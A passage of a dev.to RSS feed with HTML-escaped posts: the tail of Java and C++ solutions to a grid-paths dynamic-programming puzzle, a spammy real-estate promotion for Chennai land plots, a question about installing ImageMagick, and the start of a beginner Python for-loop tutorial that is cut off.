        &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;ans&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;startRow&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;][&lt;/span&gt;&lt;span class="n"&gt;startColumn&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;];&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;maxMove&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;++)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;[][]&lt;/span&gt; &lt;span class="n"&gt;temp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="n"&gt;dpCurr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dpLast&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="n"&gt;dpLast&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;temp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++)&lt;/span&gt;
                &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;++)&lt;/span&gt;
                    &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;)(((&lt;/span&gt;&lt;span class="kt"&gt;long&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="n"&gt;dpLast&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dpLast&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dpLast&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dpLast&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;])&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;1000000007L&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
            &lt;span class="n"&gt;ans&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ans&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;startRow&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;][&lt;/span&gt;&lt;span class="n"&gt;startColumn&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;])&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;1000000007&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ans&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;h4&gt;
  &lt;a href="#c-code"&gt;
  &lt;/a&gt;
  &lt;strong&gt;&lt;em&gt;C++ Code:&lt;/em&gt;&lt;/strong&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;br&gt;(&lt;em&gt;Jump to&lt;/em&gt;: &lt;a href="#description"&gt;&lt;em&gt;Problem Description&lt;/em&gt;&lt;/a&gt; || &lt;a href="#idea"&gt;&lt;em&gt;Solution Idea&lt;/em&gt;&lt;/a&gt;)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight cpp"&gt;&lt;code&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Solution&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nl"&gt;public:&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;findPaths&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;maxMove&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;startRow&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;startColumn&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;maxMove&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="n"&gt;vector&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;vector&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;vector&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
            &lt;span class="n"&gt;dpLast&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;vector&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;ans&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;startRow&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;startColumn&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;maxMove&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;swap&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dpLast&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                    &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)(((&lt;/span&gt;&lt;span class="kt"&gt;long&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;dpLast&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dpLast&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dpLast&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dpLast&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;1000000007L&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="n"&gt;ans&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ans&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;startRow&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;startColumn&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;1000000007&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ans&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



</description>
      <category>algorithms</category>
      <category>javascript</category>
      <category>java</category>
      <category>python</category>
    </item>
    <item>
      <title>What’s next if you wish to invest?
</title>
      <author>Fox It</author>
      <pubDate>Thu, 24 Jun 2021 08:58:02 +0000</pubDate>
      <link>https://dev.to/foxit/what-s-next-if-you-wish-to-invest-26fa</link>
      <guid>https://dev.to/foxit/what-s-next-if-you-wish-to-invest-26fa</guid>
      <description>&lt;p&gt;In several cases, no one however you'll be able to answer these queries, supported your money circumstances, your personal preferences, your expertise, and therefore the specific opportunities that you've got access to.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://nammafamilybuilder.com/land-for-sale-a-proper-guideline/"&gt;https://nammafamilybuilder.com/land-for-sale-a-proper-guideline/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;But don’t let associate degree abundance of choices intimidate you into not selecting something in any respect — there’s an excellent probability that property will profit your investment portfolio in some ways for land for sale.&lt;/p&gt;

&lt;p&gt;Depending on whether or not you opt to take a position in the property, and therefore the investment model you think is best for you, you would possibly realize that &lt;/p&gt;

&lt;p&gt;Fundraise represents a really revolutionary opportunity: accessible to everybody, investments of just about any size, really passive, and with minimal fees.&lt;/p&gt;

&lt;p&gt;We engineered Fundraise to create investment privately market property quicker and easier than it’s ever been. able to begin respondent a couple of of the key queries above? you'll be able to examine Fund rise's investment plans and opportunities here.&lt;br&gt;
On the opposite hand, platforms that invest property will offer exposure to dozens of properties within the private market, which, in total, will represent considerably deeper diversification.&lt;/p&gt;

&lt;p&gt;How to Invest in the property while not shopping for plots for sale.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://nammafamilybuilder.com/choose-the-best-plots-for-sale-near-me/"&gt;https://nammafamilybuilder.com/choose-the-best-plots-for-sale-near-me/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Best to buy for individual property:&lt;/p&gt;

&lt;p&gt;We have multiple benefits throughout this strategy, listed few them:&lt;br&gt;
you are the direct sole owner of the property/land the investment property sits on.&lt;/p&gt;

&lt;p&gt;principally the dealing is with you alone, and you are not dependent or to attend on various sales for the project to travel ahead successfully.&lt;/p&gt;

&lt;p&gt;Land purchasable is that the first and foremost property to occupy throughout a bigger place.&lt;/p&gt;

&lt;p&gt;Focus and decide on three / four-bedroom properties:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://nammafamilybuilder.com/plot-for-sale/"&gt;https://nammafamilybuilder.com/plot-for-sale/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Plan to get 3-bedroom / 4-bedroom property inside the market, where the great action happens, it's where you'll notice the long-selling demand and rental charm, which means excellent semi permanent capital growth.&lt;/p&gt;

&lt;p&gt;If this happens, your budget can stretch there, then that is the good place to be, that is the simplest place to buy for your future in plots for sale in Chennai.&lt;/p&gt;

&lt;p&gt;perpetually remain high of things of your investment:&lt;/p&gt;

&lt;p&gt;principally avoid multiple possession structures whereas buying a property (like syndicates, etc), they eventually leave the&lt;/p&gt;

&lt;p&gt;with no exit risk and no management.&lt;/p&gt;

&lt;p&gt;Then avoid very long lease property of over five years, even from the government. departments, if you are buying a current one. Again, there is not any ability to exit at the side of your original equity against your property.&lt;/p&gt;

&lt;p&gt;The key to establishing a budget and projected to that is to arrange and analyze the maximum amount before as potential. &lt;/p&gt;

&lt;p&gt;From council restrictions through to soil composition and property, understanding however a block is often developed can make sure the sleek development of your dream&lt;/p&gt;

&lt;p&gt;If there's native vegetation on your property, you may be needed to style around it and prove that your plans try for disturbance of it. Currently, there are unit incentives for builders in Chennai.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://nammafamilybuilder.com/"&gt;https://nammafamilybuilder.com/&lt;/a&gt;&lt;/p&gt;

</description>
      <category>realestate</category>
      <category>investment</category>
      <category>plots</category>
      <category>land</category>
    </item>
    <item>
      <title>How to install ImageMagick?</title>
      <author>Misty Spencer</author>
      <pubDate>Thu, 24 Jun 2021 08:54:51 +0000</pubDate>
      <link>https://dev.to/lieulieu/shop-ban-son-black-rouge-chinh-hang-15a</link>
      <guid>https://dev.to/lieulieu/shop-ban-son-black-rouge-chinh-hang-15a</guid>
      <description>&lt;p&gt;I've recently picked up interest in contributing to this platform (forem/dev.to) so I've been reading the documentation.&lt;/p&gt;

&lt;p&gt;I'm now stuck on the installation of ImageMagick. I run on Windows OS so im not sure if i'm to install ImageMagick on WSL or on my machine itself.&lt;/p&gt;

&lt;p&gt;Please help clarify. Thanks!&lt;/p&gt;

</description>
      <category>help</category>
    </item>
    <item>
      <title>Learning Python- basic course: day 4, The for loop</title>
      <author>Aatmaj</author>
      <pubDate>Thu, 24 Jun 2021 08:49:17 +0000</pubDate>
      <link>https://dev.to/aatmaj/learning-python-basic-course-day-4-the-for-loop-40m8</link>
      <guid>https://dev.to/aatmaj/learning-python-basic-course-day-4-the-for-loop-40m8</guid>
      <description>&lt;h2&gt;
  &lt;a href="#welcome-all-to-the-day-4-of-our-course-today-we-will-learn-about-the-for-loop-and-all-its-pitfalls"&gt;
  &lt;/a&gt;
  🤟Welcome all to the day 4 of our course. Today we will learn about the for loop and all it's pitfalls.😀
&lt;/h2&gt;




&lt;p&gt;&lt;strong&gt;Loops in python&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;The For loop&lt;/strong&gt;- Everyone knows that the For Loop is a type of loop which runs statements for a given number of times. Here is the for loop syntax-&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
 &lt;span class="c1"&gt;#statement 
#the statement will run k times
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Again, no curly braces, just indention.&lt;br&gt;
Here is a sample program which prints hello five times. Note the mistakes often made by beginners.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#don't forget the semicolon
&lt;/span&gt;  &lt;span class="n"&gt;File&lt;/span&gt; &lt;span class="s"&gt;"&amp;lt;stdin&amp;gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                        &lt;span class="o"&gt;^&lt;/span&gt;
&lt;span class="nb"&gt;SyntaxError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;invalid&lt;/span&gt; &lt;span class="n"&gt;syntax&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"hello"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#don't forget the indent
